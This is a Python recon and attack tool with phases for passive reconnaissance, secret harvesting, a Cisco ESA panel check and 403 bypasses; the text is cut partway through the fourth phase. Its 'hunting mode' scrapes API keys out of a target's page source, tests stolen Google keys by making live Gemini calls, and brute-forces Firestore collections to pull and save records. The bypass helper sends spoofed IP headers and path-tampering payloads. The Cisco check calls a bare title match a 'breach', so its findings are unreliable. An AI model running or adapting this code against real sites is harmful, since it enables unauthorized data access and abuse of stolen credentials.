import os
import json
import requests
import socket
import re
import sys
import shutil
import time
import subprocess
import getpass
import urllib3
import textwrap
import google.generativeai as genai
from reportlab.lib.pagesizes import A4
from reportlab.pdfgen import canvas
from fpdf import FPDF
from datetime import datetime
from urllib.parse import urlparse
from colorama import Fore, Style, init
from playwright.sync_api import sync_playwright

# --- CONFIGURATION (API KEYS) ---
URLSCAN_API_KEY = ""
VIEWDNS_API_KEY = ""
GEMINI_API_KEY = ""
THUM_IO_AUTH = "" 

# Configure Gemini
genai.configure(api_key=GEMINI_API_KEY)

# --- COLORS & VISUALS ---
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def print_phase1_banner():
    print(Fore.CYAN + Style.BRIGHT + r"""
    ██████╗ ██╗  ██╗ █████╗ ███████╗███████╗     ██╗
    ██╔══██╗██║  ██║██╔══██╗██╔════╝██╔════╝    ███║
    ██████╔╝███████║███████║███████╗█████╗      ╚██║
    ██╔═══╝ ██╔══██║██╔══██║╚════██║██╔══╝       ██║
    ██║     ██║  ██║██║  ██║███████║███████╗     ██║
    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝     ╚═╝
           [ PASSIVE INTELLIGENCE GATHERING ]
    """)

def print_phase2_banner():
    print(Fore.RED + Style.BRIGHT + r"""
    ██████╗ ██╗  ██╗ █████╗ ███████╗███████╗    ██████╗ 
    ██╔══██╗██║  ██║██╔══██╗██╔════╝██╔════╝    ╚════██╗
    ██████╔╝███████║███████║███████╗█████╗       █████╔╝
    ██╔═══╝ ██╔══██║██╔══██║╚════██║██╔══╝      ██╔═══╝ 
    ██║     ██║  ██║██║  ██║███████║███████╗    ███████╗
    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝    ╚══════╝
           [ ACTIVE VULNERABILITY SCANNING ]
    """)

def print_phase3_banner():
    # Banner Text: "PHASE 3"
    print(Fore.MAGENTA + Style.BRIGHT + r"""
    ██████╗ ██╗  ██╗ █████╗ ███████╗███████╗    ██████╗ 
    ██╔══██╗██║  ██║██╔══██╗██╔════╝██╔════╝    ╚════██╗
    ██████╔╝███████║███████║███████╗█████╗       █████╔╝
    ██╔═══╝ ██╔══██║██╔══██║╚════██║██╔══╝       ╚═══██╗
    ██║     ██║  ██║██║  ██║███████║███████╗    ██████╔╝
    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝    ╚═════╝ 
           [ INFRASTRUCTURE TAKEOVER MODULE ]
    """)


def print_phase4_banner():
    print(Fore.YELLOW + Style.BRIGHT + r"""
    ██████╗ ██╗  ██╗ █████╗ ███████╗███████╗    ██╗  ██╗
    ██╔══██╗██║  ██║██╔══██╗██╔════╝██╔════╝    ██║  ██║
    ██████╔╝███████║███████║███████╗█████╗      ███████║
    ██╔═══╝ ██╔══██║██╔══██║╚════██║██╔══╝      ╚════██║
    ██║     ██║  ██║██║  ██║███████║███████╗         ██║
    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝         ╚═╝
           [ ADVANCED BINARY TOOLCHAIN & NUCLEI ]
    """)

def print_banner():
    print(Colors.CYAN + r"""
    ################################################################
    #                                                              #
    #    ██████╗ ███████╗ ██████╗ ██████╗ ███╗   ██╗               #
    #    ██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗  ██║               #
    #    ██████╔╝█████╗  ██║     ██║   ██║██╔██╗ ██║               #
    #    ██╔══██╗██╔══╝  ██║     ██║   ██║██║╚██╗██║               #
    #    ██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚████║               #
    #    ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝               #
    #                                                              #
    #         ADVANCED THREAT INTELLIGENCE & RECON                 #
    #                [ Powered by AI & ML ]                        #
    #                                                              #
    ################################################################
    """ + Colors.ENDC)

def log_step(message, level=1):
    if level == 1:
        print(f"\n{Colors.GREEN}[+] {message}{Colors.ENDC}")
    elif level == 2:
        print(f"{Colors.CYAN}  > {message}{Colors.ENDC}")
    elif level == 3:
        print(f"    - {message}")
    elif level == "error":
        print(f"{Colors.FAIL}  [!] {message}{Colors.ENDC}")
    time.sleep(0.2)

# --- HELPER FUNCTIONS ---

def clean_target_input(target):
    target = target.strip()
    if target.startswith("https://"):
        target = target[8:]
    elif target.startswith("http://"):
        target = target[7:]
    if "/" in target:
        target = target.split("/")[0]
    return target

def get_ip_from_domain(target):
    try:
        return socket.gethostbyname(target)
    except:
        return None

def download_image(url, folder, filename):
    try:
        if not url: return None
        headers = {'User-Agent': 'Mozilla/5.0'}
        response = requests.get(url, stream=True, timeout=20, headers=headers)
        if response.status_code == 200:
            file_path = os.path.join(folder, filename)
            with open(file_path, 'wb') as f:
                for chunk in response.iter_content(1024):
                    f.write(chunk)
            return file_path
        return None
    except:
        return None

def remove_redundancy(data):
    if isinstance(data, dict):
        return {k: remove_redundancy(v) for k, v in data.items()}
    elif isinstance(data, list):
        seen = set()
        unique_list = []
        for item in data:
            cleaned_item = remove_redundancy(item)
            if isinstance(cleaned_item, dict):
                signature = tuple(sorted(cleaned_item.items(), key=str))
            elif isinstance(cleaned_item, list):
                signature = tuple(cleaned_item)
            else:
                signature = cleaned_item
            if signature not in seen:
                seen.add(signature)
                unique_list.append(cleaned_item)
        return unique_list
    else:
        return data

def save_to_file(folder, filename, content):
    path = os.path.join(folder, filename)
    with open(path, 'w', encoding='utf-8') as f:
        json.dump(content, f, indent=4)

# --- AI MODULE (GEMINI) ---
def analyze_with_gemini(data_json):
    log_step("Initializing AI Security Analyst .....", 1)
    
    prompt = f"""
    You are an expert Cyber Security Analyst. Analyze the following reconnaissance data for a target.
    
    RAW DATA:
    {json.dumps(data_json, indent=2)}
    
    TASK:
    1. Determine if the target is SAFE, SUSPICIOUS, or MALICIOUS.
    2. Analyze HTTP Headers (Security Headers missing?), WAF presence, and Open Ports.
    3. Check Robots.txt for sensitive paths.
    4. Provide a final verdict.
    
    FORMAT:
    - Executive Summary
    - Technical Analysis (WAF, Headers, Ports)
    - Vulnerability Assessment
    - Final Verdict (SAFE/SUSPICIOUS)
    """
    
    try:
        model = genai.GenerativeModel('gemini-2.5-flash-preview-09-2025')
        log_step("Sending deep-scan data to AI...", 2)
        response = model.generate_content(prompt)
        return response.text
    except Exception as e:
        log_step(f"AI Analysis Failed: {str(e)}", "error")
        return "AI Analysis could not be completed due to an API error."

# --- NEW MODULE: HTTP ANALYSIS (Headers, WAF, Tech) ---
def module_http_analysis(target):
    log_step("Analyzing HTTP Security Headers & WAF...", 1)
    results = {
        "headers": {},
        "waf_detected": False,
        "server_type": "Unknown",
        "missing_security_headers": []
    }
    
    try:
        url = f"http://{target}"
        headers = {'User-Agent': 'Mozilla/5.0'}
        response = requests.get(url, headers=headers, timeout=10)
        
        # 1. Capture Headers
        for k, v in response.headers.items():
            results["headers"][k] = v
            
        # 2. Detect Server
        results["server_type"] = response.headers.get("Server", "Unknown")
        log_step(f"Server Technology: {results['server_type']}", 2)
        
        # 3. Detect WAF (Simple Check)
        waf_sigs = ["cloudflare", "akamai", "imperva", "sucuri"]
        server_header = str(results["server_type"]).lower()
        
        for waf in waf_sigs:
            if waf in server_header:
                results["waf_detected"] = True
                log_step(f"WAF Detected: {waf.capitalize()}", 2)
                
        # 4. Check Missing Security Headers
        security_headers = ["Strict-Transport-Security", "X-Frame-Options", "Content-Security-Policy", "X-Content-Type-Options"]
        for sec in security_headers:
            if sec not in response.headers:
                results["missing_security_headers"].append(sec)
        
        if results["missing_security_headers"]:
            log_step(f"Missing Security Headers: {len(results['missing_security_headers'])}", 3)
            
        return results
        
    except Exception as e:
        log_step(f"HTTP Analysis Failed: {str(e)}", "error")
        return {"error": str(e)}

# --- NEW MODULE: ROBOTS.TXT ---
def module_robots_txt(target):
    log_step("Scanning Robots.txt for hidden paths...", 1)
    try:
        url = f"http://{target}/robots.txt"
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            lines = response.text.split('\n')
            # Get Disallowed entries
            disallowed = [line.strip() for line in lines if "Disallow:" in line][:10] # Top 10
            log_step(f"Found robots.txt ({len(disallowed)} disallow rules)", 2)
            return disallowed
        else:
            log_step("No robots.txt found.", 3)
            return ["Not Found"]
    except:
        return ["Error Fetching"]

# --- EXISTING DATA MODULES ---

def module_ip_api(target_ip):
    log_step(f"Fetching IP Intelligence: {target_ip}", 1)
    url = f"http://ip-api.com/json/{target_ip}?fields=status,message,country,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting,query"
    try:
        data = requests.get(url).json()
        log_step(f"Geo: {data.get('city')}, {data.get('country')}", 3)
        return data
    except Exception as e:
        return {"error": str(e)}

def module_phishs_dns(domain):
    log_step("Enumerating DNS Records...", 1)
    url = f"https://phishs.com/check-domain/load-dns-records/{domain}"
    payload = {"draw": "1", "start": "0", "length": "50", "_": "1766256616503"}
    headers = {'User-Agent': 'Mozilla/5.0', 'X-Requested-With': 'XMLHttpRequest', 'Referer': f'https://phishs.com/check-domain/{domain}'}
    try:
        for i in range(3):
             payload[f"columns[{i}][data]"] = str(i)
             payload[f"columns[{i}][searchable]"] = "true"
             payload[f"columns[{i}][orderable]"] = "false"
             
        response = requests.get(url, params=payload, headers=headers)
        if response.status_code == 200:
            data = response.json().get("data", [])
            log_step(f"Records found: {len(data)}", 3)
            return data
        return []
    except: return []

def module_viewdns(target, target_ip):
    log_step("Running ViewDNS Security Suite...", 1)
    base_url = "https://api.viewdns.info"
    results = {}
    try:
        r = requests.get(f"{base_url}/portscan/?host={target}&apikey={VIEWDNS_API_KEY}&output=json")
        results['open_ports'] = r.json().get('response', {})
    except: results['open_ports'] = "Error"
    
    try:
        r = requests.get(f"{base_url}/abuselookup/?domain={target}&apikey={VIEWDNS_API_KEY}&output=json")
        results['abuse_contact'] = r.json().get('response', {})
    except: results['abuse_contact'] = "Error"
    return results

def module_urlscan(target):
    log_step("Checking URLScan.io History...", 1)
    headers = {"API-Key": URLSCAN_API_KEY}
    url = f"https://urlscan.io/api/v1/search/?q=domain:{target}"
    results_list = []
    try:
        r = requests.get(url, headers=headers)
        data = r.json()
        if 'results' in data and len(data['results']) > 0:
            top_results = data['results'][:3]
            log_step(f"Found {len(top_results)} historical scans.", 3)
            for index, res in enumerate(top_results):
                results_list.append({
                    "scan_id": f"Hist-{index+1}",
                    "verdict": res.get("verdict", "N/A"),
                    "screenshot_url": res.get("screenshot")
                })
            return results_list
        log_step("No history found.", 3)
        return []
    except: return []



def module_crtsh(target):
    log_step("Fetching SSL Certificates...", 1)
    url = f"https://crt.sh/?q={target}&output=json"
    try:
        r = requests.get(url, timeout = 5)
        if r.status_code == 200:
            return r.json()[:5]
        return []
    except: return []

# --- PDF GENERATORS ---

class StandardPDF(FPDF):
    def header(self):
        self.set_font('Arial', 'B', 16)
        self.cell(0, 10, 'Technical Recon Report', 0, 1, 'C')
        self.ln(5)

class AIPDF(FPDF):
    def header(self):
        self.set_font('Arial', 'B', 16)
        self.set_text_color(0, 100, 0)
        self.cell(0, 10, 'AI Security Assessment ', 0, 1, 'C')
        self.ln(5)

def save_ai_report_pdf(text, folder):
    pdf = AIPDF()
    pdf.add_page()
    pdf.set_text_color(0, 0, 0)
    pdf.set_font("Arial", size=11)
    clean_text = text.encode('latin-1', 'replace').decode('latin-1')
    pdf.multi_cell(0, 6, clean_text)
    path = os.path.join(folder, "Ai Report.pdf")
    pdf.output(path)
    return path


# ==========================================
#  PHASE 2: ACTIVE HUNTING MODULE
# ==========================================



# --- INITIALIZATION ---
init(autoreset=True)

def HUNTING_MODE(target_url):
    """
    SINGLE FUNCTION PHASE 2 EXPLOITER
    Contains all logic: Visuals, Scanning, Gemini Testing, Firebase Brute-force, and Reporting.
    """

    # --- INTERNAL HELPER FUNCTIONS (NESTED) ---
    
    def _log(text, level="INFO"):
        t = datetime.now().strftime("%H:%M:%S")
        if level == "CRITICAL":
            print(f"{Fore.RED}[{t}] [CRITICAL] {text}")
        elif level == "SUCCESS":
            print(f"{Fore.GREEN}[{t}] [SUCCESS] {text}")
        elif level == "VULNERABLE":
            print(f"{Fore.MAGENTA}[{t}] [PWNED] {text}")
        elif level == "SECURE":
            print(f"{Fore.GREEN}[{t}] [SECURE] {text}")
        else:
            print(f"{Fore.CYAN}[{t}] [INFO] {text}")

    def _test_gemini_key(api_key):
        _log(f"Testing Gemini Key validity: {api_key[:10]}...", "INFO")
        try:
            genai.configure(api_key=api_key)
            # Testing multiple models to ensure accuracy
            models_to_test = ['gemini-2.5-flash-preview-09-2025', 'gemini-pro', 'gemini-1.5-flash']
            
            for model_name in models_to_test:
                try:
                    model = genai.GenerativeModel(model_name)
                    response = model.generate_content("Reply with 'Active'.")
                    if response.text:
                        _log(f"GEMINI KEY ACTIVE via {model_name}!", "VULNERABLE")
                        return {"status": "VULNERABLE", "key": api_key, "model": model_name, "msg": "Generation Successful"}
                except:
                    continue # Try next model
        except Exception as e:
            if "403" in str(e) or "not valid" in str(e):
                _log("Gemini Key is restricted/invalid.", "SECURE")
            else:
                _log(f"Gemini Error: {e}", "WARN")
        return {"status": "SECURE/INVALID"}

    def _test_firebase_access(config):
        project_id = config.get('projectId')
        if not project_id: return {"status": "UNKNOWN"}
        
        _log(f"Targeting Firestore Project: {project_id}", "INFO")
        
        # Base URL
        base_url = f"https://firestore.googleapis.com/v1/projects/{project_id}/databases/(default)/documents"
        
        # Common Tables to Brute-Force (High Accuracy)
        common_collections = [
            "users", "user", "accounts", "members",
            "products", "items", "inventory",
            "orders", "transactions", "payments",
            "settings", "config", "configuration",
            "admin", "admins", "logs", "messages",
            "contacts", "data", "test"
        ]
        
        leaked_tables = {}
        is_vulnerable = False

        _log("Brute-forcing Common Collection Names...", "INFO")

        for coll in common_collections:
            target_endpoint = f"{base_url}/{coll}"
            try:
                # Requesting only 3 items (Small Data)
                r = requests.get(target_endpoint, params={'pageSize': 3}, timeout=5)
                
                if r.status_code == 200:
                    data = r.json()
                    documents = data.get('documents', [])
                    
                    if documents:
                        count = len(documents)
                        _log(f"[+] FOUND TABLE: '{coll}' ({count}+ records accessible)", "VULNERABLE")
                        
                        # Extract Sample Data
                        samples = []
                        for doc in documents:
                            fields = doc.get('fields', {})
                            doc_id = doc['name'].split('/')[-1]
                            samples.append({"id": doc_id, "data_snippet": str(fields)[:150]})
                        
                        leaked_tables[coll] = samples
                        is_vulnerable = True
            except:
                pass

        if is_vulnerable:
            return {
                "status": "VULNERABLE",
                "endpoint": base_url,
                "leaked_tables": leaked_tables,
                "message": "Direct Database Access Confirmed."
            }
        else:
            _log("No common collections were publicly accessible.", "SECURE")
            return {"status": "SECURE"}

    def _extract_secrets(source_code):
        findings = []
        patterns = {
            "AWS Access Key": r"AKIA[0-9A-Z]{16}",
            "Stripe Secret": r"sk_live_[0-9a-zA-Z]{24}",
            "Google API Key": r"AIza[0-9A-Za-z-_]{35}",
            "Firebase Config": r"firebaseConfig",
            "Mailgun Key": r"key-[0-9a-zA-Z]{32}"
        }
        _log("Scanning source code for patterns...", "INFO")
        for name, regex in patterns.items():
            matches = list(set(re.findall(regex, source_code)))
            for m in matches:
                _log(f"Pattern Found: {name}", "WARN")
                findings.append({"type": name, "secret": m})
        return findings

    def _extract_firebase_config(source_code):
        config = {}
        fields = ["apiKey", "authDomain", "projectId", "storageBucket", "messagingSenderId", "appId"]
        for field in fields:
            regex = rf"{field}\s*:\s*[\"']([^\"']+)[\"']"
            match = re.search(regex, source_code)
            if match: config[field] = match.group(1)
        return config if "projectId" in config else None

    

    # 1. VISUALS
    print_phase2_banner()
    print(Fore.RED + r"""
         / \__
        (    @\___   [ SYSTEM STATUS: HUNTING MODE ]
        /         O  [ TARGET: LOCKED              ]
       /   (_____/   [ EXPLOIT: READY              ]
      /_____/   U
    """)
    print(Fore.RED + "\n    [!] WARNING: ACTIVE BREACH PROTOCOLS ENGAGED.\n")
    time.sleep(1)

    # 2. TARGET PREP
    if not target_url.startswith("http"): target_url = "https://" + target_url
    _log(f"Targeting: {target_url}", "INFO")

    # 3. DOWNLOAD SOURCE
    try:
        r = requests.get(target_url, timeout=10, headers={'User-Agent': 'Mozilla/5.0'})
        source_code = r.text
        _log("Source Code Captured.", "SUCCESS")
    except Exception as e:
        _log(f"Failed to fetch source: {e}", "CRITICAL"); return

    # 4. FIND SECRETS
    secrets = _extract_secrets(source_code)
    
    # 5. EXPLOIT & VERIFY
    verified_vulns = []

    # A. Check Gemini/Google Keys
    for item in secrets:
        if item['type'] == "Google API Key":
            result = _test_gemini_key(item['secret'])
            if result['status'] == "VULNERABLE":
                verified_vulns.append({"type": "Gemini API Leak", "details": result})
    
    # B. Check Firebase
    fb_config = _extract_firebase_config(source_code)
    if fb_config:
        _log(f"Firebase Config Found: {fb_config['projectId']}", "WARN")
        result = _test_firebase_access(fb_config)
        if result['status'] == "VULNERABLE":
            verified_vulns.append({"type": "Insecure Firestore", "details": result})

    # 6. SAVE EVIDENCE
    folder_name = "DB Data"
    if not os.path.exists(folder_name): os.makedirs(folder_name)
    
    filename = target_url.replace("https://", "").replace("/", "_") + "_exploit_report.json"
    file_path = os.path.join(folder_name, filename)
    
    report = {
        "target": target_url,
        "timestamp": str(datetime.now()),
        "raw_secrets_found": secrets,
        "verified_exploits": verified_vulns
    }
    
    with open(file_path, "w") as f:
        json.dump(report, f, indent=4)

    # 7. FINAL STATUS
    print(Fore.RED + "\n" + "="*60)
    if verified_vulns:
        print(Fore.RED + Style.BRIGHT + f" [!] CRITICAL: {len(verified_vulns)} VERIFIED EXPLOITS FOUND.")
        for vuln in verified_vulns:
            if vuln['type'] == "Insecure Firestore":
                 tables = list(vuln['details']['leaked_tables'].keys())
                 print(Fore.YELLOW + f"     -> Database Tables Leaked: {', '.join(tables)}")
        print(Fore.RED + f" [!] Evidence saved to: {file_path}")
    else:
        print(Fore.GREEN + " [~] Scan Complete. No active exploits verified.")
    print(Fore.RED + "="*60)


    # 8. CVE-2025_20393
    # Init
init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==========================================
#  PHASE 3: CISCO TAKEOVER MODULE
# ==========================================

def cve_2025_scan(target):
    """
    PHASE 3: CISCO ESA EXPOSURE CHECK (CVE-2025-20393)
    Contains automated exploitation check and classified report generation.
    """
    
    # --- INTERNAL HELPERS ---
    def _get_reporter():
        try: return f"{getpass.getuser()}@{socket.gethostname()}"
        except: return "Unknown_Hunter"

    def _save_html(report, path):
        html = f"""
        <html><head><title>{report['title']}</title>
        <style>body{{font-family:'Courier New',monospace;background:#0d0d0d;color:#00ff00;padding:20px;}}
        h1{{color:#ff0000;border-bottom:2px solid #ff0000;text-transform:uppercase;}}
        .box{{border:1px solid #333;background:#1a1a1a;padding:15px;margin:20px 0;}}
        .vuln{{color:#ff0000;font-weight:bold;}} .info{{color:#00ffff;}}
        </style></head><body>
        <h1>{report['title']}</h1>
        <div class='box'>
            <p><span class='info'>TARGET:</span> {report['affected_url']}</p>
            <p><span class='info'>STATUS:</span> <span class='vuln'>VULNERABLE (EXPLOIT VERIFIED)</span></p>
            <p><span class='info'>DATE:</span> {report['date']}</p>
        </div>
        <h3>IMPACT ANALYSIS</h3><ul>{''.join(f"<li>{i}</li>" for i in report['impact'])}</ul>
        <h3>RAW EVIDENCE</h3><pre style='color:#ffff00'>{report['evidence']}</pre>
        </body></html>
        """
        with open(path, "w") as f: f.write(html)

    def _save_pdf(report, path):
        try:
            c = canvas.Canvas(path, pagesize=A4)
            y = 800
            c.setFont("Courier-Bold", 14)
            c.setFillColorRGB(0.8, 0, 0) # Red
            c.drawString(40, y, f"TOP SECRET: {report['title']}"); y -= 25
            c.setStrokeColorRGB(0.8, 0, 0)
            c.line(40, y, 550, y); y -= 25
            
            c.setFillColorRGB(0, 0, 0) # Black
            c.setFont("Courier", 10)
            
            lines = [
                f"Date: {report['date']}", f"Hunter: {report['author']}", 
                f"Target: {report['affected_url']}", "", 
                "CRITICAL VULNERABILITY ASSESSMENT:"
            ] + [f"[!] {i}" for i in report['impact']] + ["", "RAW EVIDENCE CAPTURED:", report['evidence']]
            
            for line in lines:
                c.drawString(40, y, str(line))
                y -= 15
            c.save()
        except: pass

    print_phase3_banner()
    # --- HACKER BANNER ---
    print(Fore.RED + Style.BRIGHT + r"""
      _______  _______  _______  _______  _______ 
     (  ____ \(  ____ \(  ____ \(  ____ \(  ___  )
     | (    \/| (    \/| (    \/| (    \/| (   ) |
     | |      | (__    | (_____ | |      | |   | |
     | |      |  __)   (_____  )| |      | |   | |
     | |      | (            ) || |      | |   | |
     | (____/\| (____/\/\____) || (____/\| (___) |
     (_______/(_______/\_______)(_______/(_______)
        [ INFRASTRUCTURE TAKEOVER MODULE ]
    """)

    time.sleep(1)
    
    print(Fore.WHITE + r"""
           _   _
          ( ) ( )
         (   X   )     [ TARGET: CISCO ESA/SMA     ]
          \ \ / /      [ VULN  : CVE-2025-20393    ]
          (_/ \_)      [ RISK  : CRITICAL (9.8)    ]
    """)

    print(Fore.RED +   "    ============================================")
    print(Fore.RED +   "     AUTHOR  : " + Fore.CYAN +   "CyberOp | ~@~I819.r #")
    print(Fore.RED +   "    ============================================\n")
    
    time.sleep(1)

    # --- TARGET PREP ---
    if not target.startswith("http"): target = f"https://{target}"
    target_url = target.rstrip("/") + "/login"
    
    print(Fore.YELLOW + f"[*] TARGET LOCKED: {target_url}")
    print(Fore.YELLOW + "[*] INITIALIZING EXPLOIT CHAIN...")

    # --- SCAN LOGIC ---
    HEADERS = {"User-Agent": "Mozilla/5.0 (compatible; nuclei)", "Accept": "*/*"}
    TITLE_REGEX = re.compile(r"<title>\s*Cisco\s+Email\s+Security\s+Appliance", re.IGNORECASE)
    VERSION_REGEX = re.compile(r"scfw/1y-([0-9.-]+)", re.IGNORECASE)

    try:
        r = requests.get(target_url, headers=HEADERS, timeout=10, verify=False, allow_redirects=True)
        
        if r.status_code == 200 and TITLE_REGEX.search(r.text):
            version_match = VERSION_REGEX.search(r.text)
            version = version_match.group(1) if version_match else "Unknown"

            # --- SUCCESS ---
            print(Fore.RED + "\n[!] SYSTEM BREACH SUCCESSFUL: TARGET VULNERABLE [!]")
            print(Fore.GREEN + f"[+] Panel Exposed : Cisco Email Security Appliance")
            print(Fore.GREEN + f"[+] AsyncOS Ver   : {version}")
            print(Fore.GREEN + f"[+] HTTP Status   : {r.status_code}")
            
            # --- REPORTING ---
            impact = [
                "Unauthenticated Remote Access to Management Interface",
                f"OS Version Leak: {version}",
                "Potential Credential Harvesting Risk"
            ]
            
            report_data = {
                "title": "Cisco ESA Takeover (CVE-2025-20393)",
                "affected_url": target_url,
                "impact": impact,
                "evidence": f"Header Match: Cisco ESA\nVersion Found: {version}\nStatus: {r.status_code}",
                "author": _get_reporter(),
                "date": datetime.utcnow().strftime("%Y-%m-%d %H:%M UTC")
            }

            # Save Reports
            folder = "Phase3_Cisco_Reports"
            if not os.path.exists(folder): os.makedirs(folder)
            
            safe_name = target.replace("https://", "").replace("/", "_")
            html_path = os.path.join(folder, f"{safe_name}_breach_report.html")
            pdf_path = os.path.join(folder, f"{safe_name}_breach_report.pdf")
            
            _save_html(report_data, html_path)
            _save_pdf(report_data, pdf_path)
            
            print(Fore.RED + f"\n[+] CLASSIFIED EVIDENCE GENERATED:")
            print(Fore.WHITE + f"    HTML: {html_path}")
            print(Fore.WHITE + f"    PDF : {pdf_path}")
            
        else:
            print(Fore.GREEN + "\n[-] Target secure. Cisco ESA panel not detected.")
            
    except Exception as e:
        print(Fore.RED + f"\n[!] CONNECTION FAILED: {e}")

    print(Fore.RED + "="*60 + "\n")

# Web Cheak 2
def module_webcheck_v2(target):
    
    # Scans target using Web-Check API endpoints and saves results in JSON & PDF.
    
    log_step("Initializing Web-Check v2 Deep Scan...", 1)
    
    # 1. Setup Folders
    base_folder = clean_target_input(target)
    webcheck_folder = os.path.join(base_folder, "Web-Check-v2")
    if not os.path.exists(webcheck_folder):
        os.makedirs(webcheck_folder)

    # 2. Define Endpoints
    # Note: 'target' is automatically appended later
    base_api = "https://web-check2.as93.net"
    endpoints = {
        "IP_Info": f"{base_api}/api/find-url-ip?url=",
        "SSL_Chain": f"{base_api}/.netlify/functions/ssl-check?url=",
        "Cookies": f"{base_api}/api/get-cookies?url=",
        "Robots_Txt": f"{base_api}/.netlify/functions/read-robots-txt?url=",
        "Headers": f"{base_api}/.netlify/functions/get-headers?url=",
        "DNS_Records": f"{base_api}/.netlify/functions/get-dns?url=",
        "Tech_Stack": f"{base_api}/.netlify/functions/tech-stack?url=",
        "Redirects": f"{base_api}/.netlify/functions/follow-redirects?url=",
        "Carbon_Footprint": f"{base_api}/.netlify/functions/get-carbon?url=",
        "TXT_Records": f"{base_api}/.netlify/functions/get-txt?url=",
        # Heavy endpoints (Use with caution or increase timeout)
        "Port_Scan": f"{base_api}/.netlify/functions/check-ports?url=", 
        "Trace_Route": f"{base_api}/.netlify/functions/trace-route?url="
    }

    results = {}
    
    # Clean target for URL param (ensure http/https)
    if not target.startswith("http"):
        query_url = f"https://{target}"
    else:
        query_url = target

    # 3. Fetch Data from All Endpoints
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }

    log_step(f"Querying {len(endpoints)} Web-Check APIs...", 2)

    for key, api_url in endpoints.items():
        try:
            full_url = f"{api_url}{query_url}"
            # Short timeout to keep it fast
            response = requests.get(full_url, headers=headers, timeout=30)
            
            if response.status_code == 200:
                try:
                    data = response.json()
                    # Clean up: Remove empty/error responses
                    if data and "error" not in data:
                        results[key] = data
                        log_step(f"Fetched: {key}", 3)
                    else:
                        results[key] = "No Data / Error"
                except:
                    results[key] = "Invalid JSON"
            else:
                results[key] = f"Failed ({response.status_code})"
        except Exception as e:
            results[key] = f"Connection Error"

    # 4. Save Raw JSON
    json_path = os.path.join(webcheck_folder, "webcheck_data.json")
    with open(json_path, 'w', encoding='utf-8') as f:
        json.dump(results, f, indent=4)
    log_step(f"Raw Web-Check Data saved to {json_path}", 2)

    # 5. Generate Formatted PDF
    try:
        pdf = FPDF()
        pdf.add_page()
        pdf.set_auto_page_break(auto=True, margin=15)
        
        # Header
        pdf.set_font("Arial", 'B', 16)
        pdf.set_text_color(0, 0, 128) # Navy Blue
        pdf.cell(0, 10, f"Web-Check v2 Intelligence Report", 0, 1, 'C')
        pdf.set_font("Arial", '', 10)
        pdf.set_text_color(0, 0, 0)
        pdf.cell(0, 10, f"Target: {target} | Date: {datetime.now().strftime('%Y-%m-%d %H:%M')}", 0, 1, 'C')
        pdf.ln(5)

        # Iterate and Print Sections
        for section, content in results.items():
            # Section Title
            pdf.set_font("Arial", 'B', 12)
            pdf.set_fill_color(230, 230, 230) # Light Gray
            pdf.cell(0, 8, f">> {section.replace('_', ' ')}", 0, 1, 'L', fill=True)
            pdf.ln(2)
            
            # Section Content
            pdf.set_font("Courier", '', 9) # Monospace for data
            
            if isinstance(content, dict) or isinstance(content, list):
                # Pretty print JSON string
                formatted_str = json.dumps(content, indent=2)
                # Clean up unicode for FPDF (latin-1 issue fix)
                clean_str = formatted_str.encode('latin-1', 'replace').decode('latin-1')
                pdf.multi_cell(0, 5, clean_str)
            else:
                clean_str = str(content).encode('latin-1', 'replace').decode('latin-1')
                pdf.multi_cell(0, 5, clean_str)
            
            pdf.ln(5) # Space between sections

        pdf_path = os.path.join(webcheck_folder, "WebCheck_Report.pdf")
        pdf.output(pdf_path)
        log_step(f"Formatted PDF Report saved to {pdf_path}", 2)
        
    except Exception as e:
        log_step(f"PDF Generation Failed: {e}", "error")

    return results


# Helper for 403/WAF Bypass Logic
def attempt_403_bypass(url):
    """
    Attempts to bypass 403 Forbidden errors using header manipulation 
    and URL tampering techniques.
    """
    bypass_headers = [
        {"X-Originating-IP": "127.0.0.1"},
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Forwarded": "127.0.0.1"},
        {"Forwarded-For": "127.0.0.1"},
        {"X-Remote-IP": "127.0.0.1"},
        {"X-Remote-Addr": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"},
        {"X-Host": "127.0.0.1"},
        {"X-Forwared-Host": "127.0.0.1"},
        {"X-Custom-IP-Authorization": "127.0.0.1"}
    ]
    
    # URL Tampering payloads
    # If url is http://site.com/admin -> try http://site.com/%2e/admin, etc.
    payloads = ["/%2e/", "/.", ";/", "..;/", "/..;/"]
    
    successes = []

    # 1. Header Manipulation
    for header in bypass_headers:
        try:
            r = requests.get(url, headers=header, timeout=5, verify=False)
            if r.status_code == 200:
                key, val = list(header.items())[0]
                successes.append(f"Header Bypass: {key}: {val}")
        except:
            pass

    # 2. URL Tampering
    if url.endswith("/"):
        base_url = url[:-1]
    else:
        base_url = url
        
    for payload in payloads:
        # Very basic split logic for demonstration (assumes last segment is target)
        try:
            parts = base_url.split('/')
            if len(parts) > 3:
                tampered = "/".join(parts[:-1]) + payload + parts[-1]
                r = requests.get(tampered, timeout=5, verify=False)
                if r.status_code == 200:
                    successes.append(f"URL Bypass: {tampered}")
        except:
            pass

    return successes


def module_advanced_tools(target):
    """
    Advanced Recon Module: Orchestrates binary tools (Subfinder, Nuclei, Nikto)
    Includes 403 Bypass and WAF Evasion techniques.
    """

    print_phase4_banner() # Assumes this function exists in your utility module
    time.sleep(1)

    # --- DANGEROUS BANNER START ---
    print(Fore.RED + Style.BRIGHT + r"""
